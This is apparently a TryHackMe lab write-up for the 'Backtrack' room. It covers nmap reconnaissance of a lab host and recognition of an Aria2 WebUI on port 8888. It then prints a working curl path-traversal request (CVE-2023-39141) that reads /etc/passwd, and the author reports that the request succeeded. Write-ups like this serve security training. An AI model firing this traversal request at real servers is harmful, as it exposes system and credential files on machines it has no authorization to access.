# <div align="center">[Backtrack TryHackMe Walkthrough]()</div>
<div align="center"></div>
<div align="center">
  
</div>

## Initial Reconnaissance
I started with a standard nmap scan to enumerate services and versions on the target.

```
nmap -sV -sC 10.49.138.252
```
The scan output I observed was:
```
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 55:41:5a:65:e3:d8:c2:4f:59:a1:68:b6:79:8a:e3:fb (RSA)
|   256 79:8a:12:64:cc:5c:d2:b7:38:dd:4f:07:76:4f:92:e2 (ECDSA)
|_  256 ce:e2:28:01:5f:0f:6a:77:df:1e:0a:79:df:9a:54:47 (ED25519)
8080/tcp open  http            Apache Tomcat 8.5.93
|_http-title: Apache Tomcat/8.5.93
|_http-favicon: Apache Tomcat
8888/tcp open  sun-answerbook?
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 200 OK
|     Content-Type: text/html
|     Date: Sun, 09 Nov 2025 14:11:57 GMT
|     Connection: close
|     <!doctype html>
|     <html>
|     <!-- {{{ head -->
|     <head>
|     <link rel="icon" href="../favicon.ico" />
|     <meta charset="utf-8">
|     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
|_    <svg aria-hidden="true" style="position: absolute; width: 0; height: 0; overflow: hidden;" version="1.1" xm
```
From the scan I noted three open ports and services:
* 22/tcp - OpenSSH 8.2p1 (standard SSH)
* 8080/tcp - Apache Tomcat 8.5.93 (default Tomcat web page)
* 8888/tcp - HTTP service responding with an Aria2 WebUI page (nmap's fingerprint shows Aria2 WebUI)

## Vulnerability Reasearch
I focused on the web UI on port 8888. After inspecting the web interface I recognized it as Aria2 WebUI, which has a known path traversal vulnerability tracked as CVE-2023–39141.
I tested a simple proof-of-concept path-traversal request using curl (exact command I ran):
```
curl --path-as-is http://10.48.148.167:8888/../../../../../../../../../../../../../../../../../../../../etc/passwd
```
The curl request returned the contents of /etc/passwd. This confirms the Aria2 WebUI instance is vulnerable to a directory traversal (path-traversal) allowing access to files outside the webroot.

<img width="1299" height="865" alt="image" src="https://github.com/user-attachments/assets/86a1aae0-c5a0-498e-a745-ba91c0401dd2" />
